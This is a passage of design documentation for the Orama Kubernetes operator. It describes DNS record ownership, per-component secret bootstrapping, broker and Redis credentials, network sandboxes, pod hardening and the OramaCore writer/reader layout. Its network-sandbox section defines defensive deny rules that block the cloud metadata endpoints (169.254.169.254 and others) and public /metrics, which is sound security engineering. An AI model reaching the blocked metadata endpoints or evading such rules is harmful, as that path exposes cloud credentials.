in `status.recordID` is deleted through the same ownership check as cleanup: a marked record
only while its comment matches, a legacy record by ID, a 404 counted as deleted. One that
lost its comment is left, reported with `RecordNotOwned` and no longer tracked. If the delete
fails, the old ID stays in status and the next pass retries it. `deletionPolicy: Retain`
never deletes the old record; the resource only stops tracking it.

`deletionPolicy: Retain` makes no Cloudflare call on deletion: the finalizer is released
and the record stays. Otherwise, deletion fetches a marked record by ID and deletes it only while its comment matches
`status.ownerComment`. Lost ownership leaves the record intact, releases the finalizer
and emits Warning `RecordNotOwned`. Legacy records retain deletion by ID. A 404 means
cleanup succeeded; other API failures retain the finalizer. Missing credentials with
an ID to clean up retain the finalizer and retry after five minutes. A resource without
an ID releases its finalizer without Cloudflare calls. Lake, Zetta and Cloud v1 parents
continue to create the same child CRs.

The operator never takes over Prod 1's live `app.orama.com`. Its cutover repoint remains
a reviewed Cloudflare change in the bridge
[cutover runbook](https://github.com/oramasearch/orama-bridge/blob/main/docs/projects/orama-cloud-v1/cutover-runbook.md),
listed in [production changes](https://github.com/oramasearch/orama-bridge/blob/main/docs/projects/orama-cloud-v1/production-changes.md).
Install the updated DNS CRD through the approved rollout mechanism before running the
new controller, so `ownerComment` persists. Lake's unchanged-ID/comment/`modified_on`
proof and the `oramadev.net` conflict, owned cleanup and lost-comment tests remain
pending Steve's explicit approval for each rollout and test-resource change; rehearse
on `v1-dev` first. The HTTP/fake-client and local API-server tests do not claim a live rollout.

## Bootstrap — config + per-component secrets (`internal/controller/config.go`)

Runs **first**. Makes the install self-bootstrapping (no manual secret pre-creation):

- **`<cr>-config` ConfigMap** (shared, non-sensitive) — service DNS for
  Postgres/ClickHouse/Redis/RabbitMQ/Typesense/DISCO/OramaCore, ports, Typesense +
  Keycloak non-secret config. Reconciled every pass.
- **Per-component secrets** `<cr>-<component>-secret` — each holds **only the dummy
  credentials that component needs** (`componentSecretData`). e.g. `search-secret` =
  `TYPESENSE_API_KEY`; `cache-secret` and `broker-secret` = empty (their passwords are generated,
  see [Credentials](#credentials--broker-and-redis-passwords-and-the-master-key-credentialsgo));
  `engine-secret` = the LLM keys (`GROQ_`, `OPENAI_`, `ANTHROPIC_`, `GOOGLE_API_KEY`) + `HF_TOKEN`;
  a third-party key that names its own Secret is not seeded ([#571](#app-compute--ingestion--workers--dashboard--docs-appgo-ingestiongo));
  `dashboard-secret` = ClickHouse/JWT/Stripe (its **Postgres
  credentials come from its own role's `<cr>-controldb-dashboard` Secret**, not here — #32, #99). No component Secret
  holds `MASTER_API_KEY`: every consumer reads `spec.masterAPIKeySecretRef`. **No shared blob** —
  a pod never sees a credential it doesn't use. **Create-if-absent** — the operator
  never overwrites an existing secret, so real / rotated values are
  preserved. Components with no secret needs (selenium, mongo) get none.

Each component consumes `envFrom: [<cr>-config, <cr>-<component>-secret]` (its own
secret only). Everything is owner-referenced → GC'd with the CR.

**Disable ≠ leave running ([#23](https://github.com/oramasearch/orama-operator/issues/23)).**
Owner-GC only fires on CR *deletion*; so when a `components.<x>.enabled` toggle flips off, the
reconciler actively **prunes** that component's owned resources by label
(`internal/controller/teardown.go` — `teardownByComponent`), covering Deployments/StatefulSets/
Services/ConfigMaps/Secrets/PDBs/Ingresses/Jobs (and the CNPG `Cluster` for `controlDB`). StatefulSet
PVCs are left behind (data preserved). Idempotent — `enable → disable → enable` round-trips cleanly
(validated on AKS: disabling `docs` pruned it, re-enabling restored it, `Ready 22/22`).

- **JWT keypair (real, generated)** — the operator generates a **real RSA-2048
  keypair** once (create-if-absent) into `<cr>-jwt` (private + public, for the
  **dashboard** to sign the OramaCore writer JWT) and `<cr>-jwt-pub` (public **only**,
  for the **engine** to verify). Least-privilege: the engine never receives the
  private key. Each stack generates its own pair; no other stack's keys are copied in. The
  pair is never rotated. When `<cr>-jwt-pub` is missing (an interrupted first run, or the Secret
  was deleted) the next reconcile recreates it from `<cr>-jwt`'s `JWT_PUBLIC_KEY` alone, with the
  same labels and owner; a signing Secret without that key fails the reconcile with a readable
  message and is left as it is. When two reconciles race to create `<cr>-jwt`, the loser derives
  the public Secret from the winner's pair. `JWT_ISSUER` is non-secret (in the ConfigMap):
  `jwtIssuer(oc)`, which is `spec.jwtIssuer`, or `orama-cloud` when that is empty, the same
  function the writer's JWT provider reads.

**Validated on AKS (2026-07-08):** per-component secrets are generated (the
`search-secret` holds only `TYPESENSE_API_KEY`, **not** the Cloudflare token); the
cache pod's `envFrom` is `[config, cache-secret]` only; Typesense + Keycloak boot
`1/1` off their scoped secrets.

> **Follow-ups:** edit the remaining dummy secret values in place for production
> (they're plain in-cluster K8s Secrets; the operator won't overwrite them). (The JWT
> keypair is already real + generated.)

## Credentials — broker and Redis passwords and the master key (`credentials.go`)

[#307](https://github.com/oramasearch/orama-operator/issues/307),
[#386](https://github.com/oramasearch/orama-operator/issues/386). Every client reads a stack-wide
credential from one Secret by `secretKeyRef`, so a value in that Secret is the value every component
connects with, and no value is in a ConfigMap, pod spec, annotation, status or log.

| Secret | Keys | Created by | Read by |
|---|---|---|---|
| `<cr>-broker-admin` | `username` (`orama`), `password` | the bootstrap step, where the broker runs locally | broker `rabbitmq.conf` and boot definitions, `RabbitMQTopology` (`adminSecretRef`); no other workload ([#796](https://github.com/oramasearch/orama-operator/issues/796)) |
| `<cr>-broker-users` | `writer-password`, `reader-password` | the bootstrap step, where the broker runs locally | the writer's and readers' render-config, `RabbitMQTopology` users `oramacore-writer` / `oramacore-reader` |
| `<cr>-broker-harvest` | `password` | the bootstrap step, where the broker runs locally | harvest-master `AMQP_HOST`, `RabbitMQTopology` user `harvest` ([#824](https://github.com/oramasearch/orama-operator/issues/824)) |
| `<cr>-cache-auth` | `password` | the bootstrap step, where the cache runs locally | Redis `--requirepass`, harvest-master `REDIS_HOST`, index-builder `REDIS_URL`, redis-http `SRH_CONNECTION_STRING` |
| `<cr>-redis-http` | `token` (64 hex characters, 32 random bytes) | the bootstrap step, where the cache runs locally | redis-http `SRH_TOKEN`, dashboard `REDIS_CACHE_TOKEN` ([below](#the-upstash-rest-shim-redis_httpgo-562)) |
| `<cr>-hpes` | `token` (64 hex characters, 32 random bytes) | the bootstrap step, where ingestion runs | HPES `API_KEY`, index-builder `ORAMA_EMBEDDINGS_BEARER` ([below](#hpes-index-builders-embeddings-hpesgo-574)) |
| `<cr>-analytics-api-key` | `ANALYTICS_API_KEY` | the bootstrap step, on every stack | readers' render-config (`reader_side.analytics.api_key`, reader-only config only), analytics-processor render-config (every `oramacores` entry's `api_key`) |
| `spec.masterAPIKeySecretRef` | `key`, default `MASTER_API_KEY` | supplied (the set's `secrets` list); never created or changed | writer render-config (`writer_side.master_api_key`), index-builder, workers, dashboard, the e2e runner; never a reader ([#795](https://github.com/oramasearch/orama-operator/issues/795)) |

- **Generated once.** Where the store runs in this cluster (enabled, not `mode: external`, not
  `placement: central` on a read region) the operator creates the Secret with a random 48-character
  hex password, owner-referenced to the CR and labelled component `credentials`, which no teardown
  removes: disabling the broker or cache keeps its password for the retained volume. An existing
  Secret, generated or supplied, is never changed, adopted or filled in. A member whose store runs
  elsewhere receives the Secret through its set's `secrets` list. `<cr>-analytics-api-key` is
  created the same way on every stack, whatever analytics-processor and ClickHouse are set to, so
  re-enabling either finds the same key. It is internal to the readers and the processor, so it is
  generated, never copied from the managing cluster, and it can only read and erase search events.
- **Checked.** A broker, cache or analytics key Secret missing a key, or holding an empty value or a
  character outside `A-Z a-z 0-9 - . _ ~` (the clients take it inside URLs and config files), fails
  the reconcile with `Ready=False` naming the Secret and key, and is left as it is. The bootstrap
  step reads each generated Secret back after creating it, so a Secret another writer created first
  is the one checked and used; no consumer starts with another key.
- **Wiring.** harvest-master gets `BROKER_USERNAME` (the literal `harvest`), `BROKER_PASSWORD` (from
  `<cr>-broker-harvest`) and `REDIS_PASSWORD` as entries placed before the URLs that reference them
  (`amqp://$(BROKER_USERNAME):$(BROKER_PASSWORD)@<cr>-broker:5672`,
  `redis://:$(REDIS_PASSWORD)@<cr>-cache:6379`), and Redis runs
  `redis-server --appendonly yes --requirepass $(REDIS_PASSWORD)`. Config files hold
  `__BROKER_PASSWORD__`, `__MASTER_API_KEY__` and `__ANALYTICS_API_KEY__` placeholders that a
  `render-config` init container fills into an `emptyDir`; the broker's own files also hold
  `__BROKER_USERNAME__`.
- **Every broker client has its own user** ([#99](https://github.com/oramasearch/orama-operator/issues/99),
  [#795](https://github.com/oramasearch/orama-operator/issues/795),
  [#796](https://github.com/oramasearch/orama-operator/issues/796),
  [#824](https://github.com/oramasearch/orama-operator/issues/824), principle 4). Only the broker
  reads `<cr>-broker-admin`. The writer signs in as `oramacore-writer` and every reader pod, of
  either image, as `oramacore-reader`; harvest-master as `harvest`. The engine user is named in the
  template and `BROKER_PASSWORD` is its key of `<cr>-broker-users` (`writer-password`,
  `reader-password`); harvest's password is `<cr>-broker-harvest`'s `password`, its own Secret so
  that neither Secret's change rolls the other's consumers. The bootstrap step generates both where
  the broker runs. What each may do on `/` (`brokerUserPermissions`, checked by
  `TestBrokerUserPermissionsAreLeastPrivilege` and `TestHarvestBrokerUserIsLeastPrivilege`):

  | User | configure | write | read |
  |---|---|---|---|
  | `oramacore-writer` | `oramacore-operations` | `oramacore-operations` | `oramacore-operations` |
  | `oramacore-reader` | `oramacore-operations`, `oramacore-reader-local` | `oramacore-reader-local` | `oramacore-operations` |
  | `harvest` | `<workerID>-<indexID>-queue` | `amq.default` (the default exchange), `<workerID>-<indexID>-queue` | `<workerID>-<indexID>-queue` |

  No reader may publish to the replication stream, and harvest may touch neither OramaCore stream.
  `oramacore-reader-local` is where the writer the combined image starts in each reader produces
  (*Combined readers* under the engine, below); nothing consumes it. Until the stack's
  `RabbitMQTopology` reports `Ready` for its generation with every user applied, no engine object
  and no harvest-master is written: a fresh stack waits instead of crash-looping on a refused
  sign-in, and a running one keeps its templates. A changed `<cr>-broker-users` rolls the writer and
  readers, a changed `<cr>-broker-harvest` only harvest-master, and a changed admin password only
  the broker.
- **Broker password on a retained volume.** RabbitMQ applies `default_user`/`default_pass` only to
  an empty data directory, so the broker also imports `/etc/rabbitmq/credentials.json` on every
  boot (`definitions.import_backend = local_filesystem`): the admin user, the `/` vhost and its
  permissions. Importing an existing user sets its password, so a changed `<cr>-broker-admin`
  takes effect when the broker rolls, without a reset or a volume deletion. Streams and per-service
  users stay with `RabbitMQTopology`.
- **The master key: named, or generated.** A stack that names no `spec.masterAPIKeySecretRef` gets
  `<cr>-master-api-key`, a random 48-character hex `MASTER_API_KEY` created once and never replaced
  (#615); a fresh stack has no copied data, so any random key is right. Production names its Secret to
  carry Prod 1's key. While the engine is enabled and a named Secret or its key is missing, or the value is empty, starts with `dev-` or holds a line break, the writer and
  readers are not created, or are scaled to zero with their volumes kept, and `Ready=False` with
  phase `Degraded` names the cause (`MasterAPIKeySecretMissing`,
  `MasterAPIKeyKeyMissing`, `MasterAPIKeyEmpty`, `MasterAPIKeyPlaceholder`, `MasterAPIKeyInvalid`)
  by namespace, Secret and key. The CR is checked again every 20 seconds and on every event of that
  Secret, and the configured replicas return once it is valid. The other consumers read the same
  Secret, named or generated. The value must equal the target control database's
  `oramacore_clusters.master_api_key`, which the dashboard reads. On a control DB with no row the
  operator inserts the `c1` row with this key and never changes it afterwards
  ([controlDB](#controldb-internalcontrollercontroldbgo)).
- **Automatic rolls.** Each workload that reads one of these Secrets carries
  `orama.cloud/credentials-hash`, the data hash of exactly the Secrets it reads (`secretDataHash`,
  shared with the LLM key hash). The controller maps every Secret event, owned or copied, to each CR
  in the namespace that reads it (`requestsForSecret`), so a changed value rolls only its consumers:
  `<cr>-broker-admin` the broker; `<cr>-broker-users` the writer and readers; `<cr>-broker-harvest`
  harvest-master; `<cr>-cache-auth` the cache,
  harvest-master, index-builder and redis-http; `<cr>-redis-http` redis-http and the dashboard; `<cr>-hpes` HPES and index-builder; `<cr>-analytics-api-key` the readers on the reader-only config
  and analytics-processor, never the writer; the master key the writer, index-builder, workers and
  dashboard, never a reader. analytics-processor's hash also covers its component
  Secret (ClickHouse password) and `<cr>-controldb-app` (the Postgres URI). Metadata changes roll
  nothing. An
  existing e2e Job is immutable and keeps the reference it was created with.

## Network sandboxes (`internal/controller/networksandbox_controller.go`)

Zetta schema Jobs carry the owning Lake's sandbox selection label when present. Their existing
ownership and version-triggered replacement behavior is unchanged; adding selection labels does
not replace a current Job. `TestZettaControlPlaneReplacesStaleSchemaJob` retains its original fixture
and assertions, including replacement of an unowned stale Job.

`NetworkSandboxReconciler` turns one namespaced `NetworkSandbox` into a mandatory ingress-and-egress
`default-deny` NetworkPolicy, an owner-scoped `deny-cloud-metadata` CiliumNetworkPolicy for
`169.254.169.254/32`, `168.63.129.16/32` and `fd00:ec2::254/128`, and every explicitly named and
justified allowance in the resource. The Cilium deny is installed before allowances and cannot
be overridden by a declaration or another allow policy.
It adopts existing unowned policies with the declared names, owns the rendered objects, removes
stale owned policies, and refuses a name already controlled by another resource. Cilium v2 API and
dataplane support are required: both policy kinds are watched unconditionally for drift/deletion
repair. A missing Cilium API is an error, not an optional skip. Kubernetes garbage collection removes
the policies with their sandbox; terminating sandboxes do not recreate them. The controller reports
stable Ready status with policy counts (including the mandatory Cilium deny) and does not rewrite
unchanged status. AKS-managed Cilium's metadata path requires explicit deny because NetworkPolicy
`ipBlock` exclusions alone did not block it in the live 2026-10-14 proof.

Only the operator manager's ClusterRole may write `NetworkPolicy`, `CiliumNetworkPolicy` or
`NetworkSandbox`. The repository RBAC audit reads every Role and ClusterRole source, counts wildcard
rules, follows bindings and rejects any other policy writer. A native API-server test impersonates a
workspace default ServiceAccount, proves an allow-all policy is forbidden and checks create, update,
patch and delete for both workspace and tenant identities. Lake, app, agent and build identities
receive no policy-writer grant.

The Lake, Lake-workspaces and Orama Cloud v1 reconcilers each own one sandbox in every namespace
they manage and render it before workloads. Their complete policy inventory, public-address
exclusions, inferred paths and recovery behavior are in
[`infrastructure/network-sandbox.md`](infrastructure/network-sandbox.md). Every pre-existing
workspace policy name and spec is preserved across the ownership migration. Six separately named
Lake-only service-ingress policies pair with Lake's workspace egress on Postgres 5432, Kafka 9092,
ClickHouse 8123/9000, TiDB 4000, Cassandra 9042 and Valkey 6379. They select vendor pods only and
admit only the owning Lake's pod labels in its exact namespace, not the Orama operator. The
`LakeApp` access reconciler adds only the corresponding owning-Lake backend ingress on the app's
declared port. Before connection activation its binding egress remains; afterwards it keeps only
DNS and owning-Lake egress, and the `Connection` controller supplies declared workload paths through
sandbox-owned policies. Tests cover both isolated ends, other owners/unlabelled pods, port changes
and no-op reconciliation. Existing operator Zetta/HTTP and
datastore-operator management paths remain unchanged.

Cloud v1 writer and reader pods retain their replication stream, engine-owned embeddings, cluster
DNS and public-address paths. The public path permits any TCP port because customer JavaScript
hooks may call an arbitrary public URL, but both IPv4 and IPv6 blocks exclude private, link-local,
metadata, carrier-grade NAT, API-server, node-address and pod-CIDR destinations. The API, node and
pod exclusions are discovered from the cluster and retained across transient discovery failure.
While `engine.writer.host` (primary region) or `engine.reader.host` is published, the sandbox also
admits ingress-nginx, and nothing else, to that stack's writer
pods on 8080 (`allow-writer-ingress-nginx`) or reader pods on the port behind the reader Service: 80
with Envoy, 8080 without (`allow-reader-ingress-nginx`). The rule goes away with the endpoint.
The zetta-tunnel gateway is never admitted: Cloud v1 is not served by it (bridge [decision 19](https://github.com/oramasearch/orama-bridge/blob/main/docs/projects/orama-cloud-v1/decisions-2026-10-17.md#19-the-public-engine-hosts-admit-ingress-nginx-only-never-the-zetta-tunnel-gateway) of
2026-10-17); without these rules the public hosts could not be reached at all.

## Workload hardening — applied to EVERY component ([#18](https://github.com/oramasearch/orama-operator/issues/18))

The engine used to be the only component wired with full probes/resources/grace/PDB; every other
workload got readiness-only and nothing else. The shared builders (`reconcileApp`,
`provisionStatefulSet`) and the engine now apply one **workload-hardening baseline** to every pod
the operator creates, so a component is run *well*, not just *running*. The helpers live in
`helpers.go` / `app.go` / `datastore.go`.

- **Health probes — startup + readiness + liveness.** The engine keeps its rich HTTP `GET /health`
  probes; every other container gets **TCP** probes on its primary port (`tcpStartup` /
  `tcpReadiness` / `tcpLiveness`). **Startup** (`30 × 10s` ≈ 5 min) gates the others so a slow boot
  (index-builder's ~29-var wiring, Keycloak `start-dev`, a store loading data) isn't killed;
  **readiness** gates Service routing; **liveness** (lenient — `20s` period) restarts a hung pod. TCP
  (not a guessed HTTP path) because a wrong liveness path would restart-loop a *healthy* pod.
- **Resource requests on every container + per-component memory limits.** `resourceReqs(memReq,
  cpuReq, memLimit)` puts CPU+memory **requests** on every container (the scheduler needs them) plus
  a **memory limit** — but **no CPU limit** (a CPU limit throttles rather than protects; the request
  suffices). Limits are sized **per component** (a blanket small one OOM-kills the heavy ones):
  light apps `512Mi`, dashboard/disco/keycloak/stores `~1Gi`, Selenium `1.5Gi`, ClickHouse `4Gi`
  (kept in lockstep with `clickhouseMemoryXML`), embeddings `4Gi`. The engine keeps its cgroup-aware
  `resourceCaps` (CPU limit included — tokio tolerates it). Every component's `resources` is
  **overridable on the CR** (`spec.components.<x>.resources`, `spec.idp.resources`,
  `spec.components.ingestion.resources`) — like the engine writer/reader already were.
- **SecurityContext baseline.** A conservative **per-container** `securityContext`
  (`allowPrivilegeEscalation: false`, drop **ALL** capabilities, seccomp `RuntimeDefault`) on every
  container — main *and* init/render/wait — safe for essentially all modern images and satisfying the
  cluster's Gatekeeper / Pod Security "baseline". Composes with pod-level settings (e.g. pgAdmin's
  `fsGroup`). Two **capability exceptions** (both found by the on-cluster smoke test, both least-
  privilege — drop ALL then add back only what's needed): a container that binds a **privileged port**
  (<1024 — Envoy and pgAdmin on `:80`) gets `CAP_NET_BIND_SERVICE` back (`containerSecurityContext`
  picks it by port); a **data store** whose image runs a root entrypoint that `chown`s the mounted
  PVC before dropping to a service user (redis/rabbitmq/clickhouse/mongo) gets `CHOWN`, `DAC_OVERRIDE`,
  `FOWNER`, `SETGID`, `SETUID` back (`dataStoreSecurityContext`) — without them the entrypoint
  crash-loops on `chown: Operation not permitted`. The stronger `runAsNonRoot` /
  `readOnlyRootFilesystem` are **deliberately not** blanket
  (they break images that expect root or write to `/`) — rolled out per-component with testing.
- **Graceful shutdown.** `terminationGracePeriodSeconds` per component — stores default **60s**
  (headroom for the SIGTERM flush: AOF fsync, part checkpoint, queue persist), stateless apps **30s**,
  the writer keeps **300s** (index flush). App containers get a `preStop` **`sleep 5`** drain so they
  leave Service endpoints before exiting (a rolling update doesn't drop in-flight requests) — an exec
  sleep, not the native `SleepAction` (only default-on from k8s 1.30), so it's portable.
- **PodDisruptionBudgets + placement.** A **PDB on every workload**: singletons (all stores, the
  writer, single-replica apps) → `maxUnavailable: 0` (block casual eviction; node maintenance handles
  it consciously); replicated sets (readers, multi-replica apps) → `maxUnavailable: 1` (roll one at a
  time). Replicated Deployments also get a **soft topology spread** across nodes
  (`kubernetes.io/hostname`, `whenUnsatisfiable: ScheduleAnyway` so a single-node sandbox still
  schedules). The one-shot **Jobs** (control-DB migrate, demo-seed) get the securityContext + requests
  but no probes/PDB (they're short-lived). **controlDB** delegates pod hardening to its own operator
  (**CNPG** owns its pods' probes/securityContext/PDB).

**Validated on AKS (2026-07-11):** a scoped (`WATCH_NAMESPACE`) smoke deploy of Redis/RabbitMQ/
ClickHouse/Typesense + pgAdmin (`:80`) + Keycloak reached **`Ready 6/6`**, every pod `1/1` with the
baseline applied (probes, per-container securityContext, requests + memory limit, `60s`/`30s` grace,
`maxUnavailable: 0` PDBs); a replicated (`replicas: 2`) Deployment got the soft topology spread + a
`maxUnavailable: 1` PDB; a CR-level `resources` override was honored over the default. The smoke
caught the two capability exceptions above before merge (drop-ALL had crash-looped the stores on
`chown` and would have broken Envoy/pgAdmin's `:80` bind).

## engine (`internal/controller/engine.go`)

Driven by `spec.region.role`:

- **Writer** (primary only) — a `StatefulSet` (1 replica) running `oramasearch/oramacore` (or the
  writer-only image, see **Side-only images** below),
  a `volumeClaimTemplate` for `/app/.data`, and the CR's nodeSelector/tolerations. Service on
  `:8080`. OramaCore itself is CPU; when `writer.gpu` is set the `nvidia.com/gpu: 1` limit goes
  on the **shared embeddings Deployment** (the model inference is the GPU consumer), not here.
- **Readers** (primary + read tiers) — a `StatefulSet` `<cr>-reader` with the
  `oramacore` container (the combined or the reader-only image) **+ an Envoy sidecar** (`envoyproxy/envoy:v1.31.2`, `:80 →
  127.0.0.1:8080`, from the generated `envoy.yaml`) when `engine.envoy` is set. Envoy answers
  `/metrics` with 404 itself, by a route before its catch-all, so OramaCore's Prometheus endpoint is
  never served through the reader Service ([#314](https://github.com/oramasearch/orama-operator/issues/314)).
  Service `<cr>-reader` on `:80` (→ Envoy, or → `:8080` if Envoy is off)
  ([#382](https://github.com/oramasearch/orama-operator/issues/382)):
  - **One disk per reader.** A `data` claim template (`ReadWriteOnce`, 10Gi by default) mounted at
    `/app/.data`, so reader `n` has its own claim `data-<cr>-reader-<n>`, never the writer's. The
    reader keeps its index and its last applied stream offset (`/app/.data/reader/read.info`)
    there, so a replaced pod resumes from that offset instead of replaying the stream from 0. It
    still needs the operations after its offset to be in the stream (5 GB, see broker-topology);
    a reader on a new, empty claim builds from the stream and is partial once the stream has
    passed 5 GB (seeding is [#458](https://github.com/oramasearch/orama-operator/issues/458)).
  - **Size.** 10Gi by default, as for every other volume, so non-production stacks stay small.
    Production sets `reader.storage.size: 512Gi` in `config/clusters/sets/v1-prod.yaml`, from
    orama-bridge's decision 3 of 2026-10-17. Its source is techops-docs
    `incident-2026-10-12-reader-stalls.md`, "Host storage": each Prod 1 reader has a 1,000 GB
    (931 GiB) gp3 root volume, with EU 777, US 659 and Asia 740 GiB free on 2026-10-12, so about
    154, 272 and 191 GiB used, OS included. 512Gi is about twice the US figure, rounded up, and an
    upper bound since the used figures include the OS.
    The template keeps the size it was created with; a larger `reader.storage.size` grows every
    reader's existing claim ([Component storage](#component-storage)), and a smaller one is a
    refused shrink.
  - **Fixed count, no autoscaler.** `replicas` is `reader.replicas` (0 or unset → 3), set on every
    reconcile; `podManagementPolicy: Parallel` starts them together. There is no
    HorizontalPodAutoscaler and no autoscaling field (#606). Claims are kept when the count drops or the StatefulSet is
    deleted (Kubernetes' default `Retain`; the operator sets no retention policy), and a reader
    that comes back reuses its claim.
  - **Headless Service** `<cr>-reader-headless` (`clusterIP: None`, reader selectors, `http`
    `:8080` straight to OramaCore with Envoy on or off, Ready pods only) is the StatefulSet's
    `serviceName` from creation, with analytics on or off, so each Ready reader is addressable as
    `<cr>-reader-<n>.<cr>-reader-headless.<ns>.svc:8080`. analytics-processor reaches each reader
    by that name ([Analytics import](#analytics-import)); disabling the import keeps the Service.
  - **From a reader Deployment.** Earlier operator versions ran `<cr>-reader` as a Deployment on an
    `emptyDir`. The operator deletes that Deployment (only when the CR controls it) with foreground
    propagation and creates the StatefulSet once it and its pods are gone; the reconcile reports
    `ReconcileError` until then and readers are down meanwhile. Nothing is copied from the
    `emptyDir`. A Deployment of that name the CR does not control is left alone and blocks the
    readers with a conflict error. Disabling the engine removes the StatefulSet, both reader
    Services and the PDB, and keeps the claims, as for the writer.

  A reader on a new, empty claim replays the writer's `oramacore-operations` stream from offset 0.
  The stream keeps 5 GB, so once more than that has been written, it can no longer build a complete
  index from it. The reader then refuses to serve rather than serve a partial index
  ([oramacore#341](https://github.com/oramasearch/oramacore/pull/341)): it exits non-zero with a
  message starting with one of two codes, and it never goes Ready. The reader container sets
  `terminationMessagePolicy: FallbackToLogsOnError` so that message reaches the pod's
  `lastState.terminated.message`, and while the `reader` component is not Ready the operator
  appends the cause to its `OramaCloudV1` status detail (`readerRefusalCause` in
  `internal/controller/status.go`):

  | Code in the reader's exit message | Appended to the `reader` detail |
  |---|---|
  | `REPLICATION_HISTORY_EXPIRED` (the offset it needs is gone from the stream) | `replication history expired; the reader cannot be built from the stream (needs a reader seed, #458)` |
  | `REPLICATION_STREAM_BEHIND` (it needs an offset ahead of the stream: wrong stream, or a restored broker) | `reader is ahead of this replication stream (wrong stream or restored broker)` |

  For example, `0/1; replication history expired; the reader cannot be built from the stream (needs a
  reader seed, #458)`. Pods being deleted, exits with code 0 and other messages add nothing; one
  cause is listed once however many readers report it. Seeding a reader from another source is not
  available yet ([#458](https://github.com/oramasearch/orama-operator/issues/458)).
- **Public hosts** (`cloudv1_networking.go`, [#385](https://github.com/oramasearch/orama-operator/issues/385))
  — `reconcileEngineIngresses` runs at the end of the enabled path and before the teardown on the
  disabled path. `writer.host` (primary region only) renders Ingress `<cr>-writer` → Service
  `<cr>-writer`:8080; `reader.host` renders `<cr>-reader` → `<cr>-reader`:80, whichever Envoy setting.
  Both go through `upsertIngress` (the dashboard's ingress class and origin TLS) and are controlled
  by the CR. A host cleared, the engine disabled or the writer's region turned `read` deletes that
  Ingress through `deletePublicEndpointOwned`, only when the CR controls it (UID and
  resourceVersion preconditions). A same-name Ingress the CR does not control is left alone and
  fails publication with a conflict. `writerPublicHost` and `readerPublicHost` decide whether an
  endpoint is published, for the Ingress, its sandbox rule and its DNS record alike. With
  `writer.jwt` set, `https://<writer.host>` must be an exact audience or the reconcile fails before
  any engine object changes. Each Ingress also answers its endpoint's `extraHosts` (below), which get
  no DNS record and do not widen the audiences.
- **`/metrics` closed on the public hosts** (`engine_metrics.go`,
  [#410](https://github.com/oramasearch/orama-operator/pull/410)) — OramaCore serves Prometheus
  metrics on `:8080/metrics` (`http.with_prometheus: true`). Every public engine Ingress has a
  companion, `<cr>-writer-metrics` or `<cr>-reader-metrics`, that `metricsBlockIngressSpec` narrows
  from the same spec (`ingressSpec`): the same class, hosts (extra hosts included), TLS Secrets,
  Service and port, but one `Exact` `/metrics` path per rule, and the single annotation
  `nginx.ingress.kubernetes.io/denylist-source-range: "0.0.0.0/0,::/0"`. ingress-nginx prefers the
  `Exact` location to the main Ingress's `Prefix /` and answers it 403 for every client; a snippet
  annotation would be refused by ingress-nginx's defaults. The companion carries no cert-manager
  annotation, so it requests no certificate of its own and serves the main Ingress's Secret. It is
  written before its main Ingress and deleted after it, with the same labels, controller and
  conflict refusal, so a published host never serves `/` without its `/metrics` refused; the
  disabled-engine teardown removes it by its writer or reader label. The readers keep Envoy's 404
  as well, so they stay closed if a companion is missing. zetta-tunnel's ingress gateway cannot
  refuse a source, so, as an interim guard until
  [#575](https://github.com/oramasearch/orama-operator/issues/575), it serves no host that a companion
  covers ([ingress](infrastructure/ingress.md#what-it-serves)); for the engine hosts, whose sandbox
  rules already admit ingress-nginx only (bridge decision 19 of 2026-10-17), it is a second safeguard: Cloud v1's engine hosts stay on ingress-nginx
  (decision 5b of the 2026-10-16 decisions page), and a stack set to `ingressClassName:
  zetta-tunnel` gets no gateway address for them. Inside the cluster `/metrics` stays on each pod's
  `:8080` (`<cr>-writer:8080`, each reader at `<cr>-reader-<n>.<cr>-reader-headless:8080`; the reader Service's port 80 is the public
  path). How Prometheus scrapes it is [#15](https://github.com/oramasearch/orama-operator/issues/15).

- **Embeddings ai-server** — ONE **shared `<cr>-embeddings` Deployment** (gRPC on `:50051`) +
  Service that the writer and all readers reach via `ai_server.host: <cr>-embeddings` (#14) —
  **not** a per-pod sidecar, so the model loads into RAM once instead of once per engine pod. This
  matches OramaCore's reference architecture (`config-docker.yaml` points `ai_server.host` at a
  standalone `python-ai-server`). `embeddingsImage()` resolves the **published**
  `oramasearch/oramacore-ai-server:latest` (or `-cuda` for `writer.gpu`, which also puts the
  `nvidia.com/gpu: 1` limit + the writer's nodeSelector/tolerations on **this** Deployment — the
  embedding model, not OramaCore, is the GPU consumer). Auto-falls back to CPUExecutionProvider on
  a CPU node. **Not** `embeddings-server-py` (the separate HPES / index-manager path). Validated on
  AKS: shared `<cr>-embeddings` pod serving gRPC, writer **1/1** + readers **2/2** (sidecar gone).

  > **Deeper redundancy ([#39](https://github.com/oramasearch/orama-operator/issues/39)):**
  > the `oramacore` image *also* embeds a Python interpreter and loads the embedding models
  > **in-process** per pod ("Building Python service" → "src.embeddings.models: Models loaded"), so
  > each writer/reader still carries a model copy independent of this shared ai-server. Whether to
  > offload those to the shared ai-server (or drop the redundant one) is tracked in #39.
- **Side-only images** ([#308](https://github.com/oramasearch/orama-operator/issues/308)) — the
  published `oramasearch/oramacore` image starts both OramaCore sides in every pod: without the
  overrides below, **every reader also runs a writer** that accepts writes sent to the reader's host
  and publishes them to the stream, and the writer builds a second, reader-side index on its own
  disk. Prod 1 runs side-only v1.2.39 builds instead. Set `spec.images.overrides.oramacore-writer`
  **and** `.oramacore-reader` (by digest) to run them: the writer pod runs the writer image and
  renders `writer.yaml`, and the reader pods run the reader image and render `reader.yaml`. Both or
  neither: one without the other (an empty value counts as unset) fails the reconcile with
  `Ready=False` (`ReconcileError`) before any resource changes; a disabled engine skips the check,
  so it can still be torn down. With both set they win over `overrides.oramacore`; with neither,
  both pods keep the combined image (`overrides.oramacore`, else `<registry>/oramacore:latest`): the
  writer renders `config.yaml`, unchanged, and the readers `combined-reader.yaml` (next).
  `status.conditions[EngineSidesSeparated]` reports which mode runs.
- **Combined readers hold no writer master key** ([#795](https://github.com/oramasearch/orama-operator/issues/795),
  LSR-133). The combined binary will not start without a `writer_side`, so `combined-reader.yaml`
  has one, but it is not the writer's: its `master_api_key` is `'__LOCAL_WRITER_KEY__'`, which the
  readers' render-config fills with 48 hex characters it generates at every pod start
  (`localWriterKeyScript`; in no Secret, known to no other pod), it has no `jwt` provider, and it
  produces to `oramacore-reader-local` as `oramacore-reader` (`readerLocalWriterSideYAML`). Its
  `reader_side` consumes `oramacore-operations` as `oramacore-reader`. So a reader's writer routes
  authenticate nothing (an unknown key over an empty collection store), a reader holds neither the
  writer's master key nor the right to publish to the stream the other readers apply, and the
